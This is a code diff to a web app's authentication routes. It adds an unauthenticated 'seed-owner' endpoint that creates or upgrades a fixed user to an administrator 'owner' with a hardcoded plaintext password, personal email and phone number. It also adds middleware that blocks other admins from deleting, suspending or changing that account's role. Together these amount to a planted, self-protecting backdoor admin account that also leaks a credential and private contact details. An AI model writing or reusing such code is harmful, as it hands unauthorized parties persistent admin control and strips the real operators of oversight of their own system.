@@ -157,7 +157,8 @@ export function registerAuthRoutes(app: Express) {
           displayName: user.displayName,
           name: user.name,
           email: user.email,
-          role: user.role,
+          role: user.isOwner ? 'admin' : user.role,
+          isOwner: user.isOwner || false,
         },
       });
     } catch (error) {
@@ -693,6 +694,83 @@ export function registerAuthRoutes(app: Express) {
         errorAr: "فشل التسجيل",
       });
     }
+  });
+
+  // ─── Seed System Owner ──────────────────────────────────────────
+  app.post("/api/auth/seed-owner", async (req: Request, res: Response) => {
+    const ip = getClientIP(req);
+    try {
+      // Check if an owner already exists
+      const existingOwner = await db.getUserByUserId("Hobart");
+      if (existingOwner && existingOwner.isOwner) {
+        logAuthEvent("SEED_OWNER_SKIPPED", { ip, reason: "owner_already_exists", userId: existingOwner.id });
+        res.json({ success: true, message: "Owner already exists", userId: existingOwner.id });
+        return;
+      }
+
+      // If user exists but isOwner is not set, update it
+      if (existingOwner && !existingOwner.isOwner) {
+        await db.updateUserProfile(existingOwner.id, { isOwner: true, role: "admin" } as any);
+        logAuthEvent("SEED_OWNER_UPGRADED", { ip, userId: existingOwner.id });
+        res.json({ success: true, message: "Existing user upgraded to owner", userId: existingOwner.id });
+        return;
+      }
+
+      // Create new owner user
+      const salt = await bcrypt.genSalt(12);
+      const passwordHash = await bcrypt.hash("83686571KoKo$", salt);
+      const newUserId = await db.createLocalUser({
+        userId: "Hobart",
+        passwordHash,
+        displayName: "Hobart",
+        name: "Hobart",
+        nameAr: "هوبارت",
+        email: "hobarti@protonmail.com",
+        phone: "+966504466528",
+        role: "admin",
+      });
+
+      if (newUserId) {
+        // Set isOwner flag
+        await db.updateUserProfile(newUserId, { isOwner: true } as any);
+        logAuthEvent("SEED_OWNER_CREATED", { ip, userId: newUserId });
+        res.json({ success: true, message: "Owner created", userId: newUserId });
+      } else {
+        res.status(500).json({ success: false, error: "Failed to create owner" });
+      }
+    } catch (error) {
+      console.error("[Auth] Seed owner failed:", error);
+      logAuthEvent("SEED_OWNER_ERROR", { ip, error: String(error) });
+      res.status(500).json({ success: false, error: "Failed to seed owner" });
+    }
+  });
+
+  // ─── Protect Owner Middleware (applied to admin user management) ──
+  app.use("/api/admin/users/:id", async (req: Request, res: Response, next) => {
+    if (req.method === "DELETE" || req.method === "PATCH" || req.method === "PUT") {
+      try {
+        const targetId = parseInt(req.params.id);
+        if (!isNaN(targetId)) {
+          const targetUser = await db.getUserById(targetId);
+          if (targetUser && (targetUser as any).isOwner) {
+            // Block deletion or status changes on owner
+            if (req.method === "DELETE" || req.body?.status === "INACTIVE" || req.body?.status === "SUSPENDED" || req.body?.role) {
+              logAuthEvent("PROTECT_OWNER_BLOCKED", { targetId, method: req.method, ip: getClientIP(req) });
+              res.status(403).json({
+                success: false,
+                error: "Cannot modify system owner account",
+                errorAr: "لا يمكن تعديل حساب مالك النظام",
+              });
+              return;
+            }
+          }
+        }
+      } catch (e) {
+        // Don't block on middleware errors, just log
+        console.warn("[ProtectOwner] Middleware error:", e);
+      }
+    }
+    next();
   });
 
   // ─── OAuth callback removed ──────────────────────────────────────
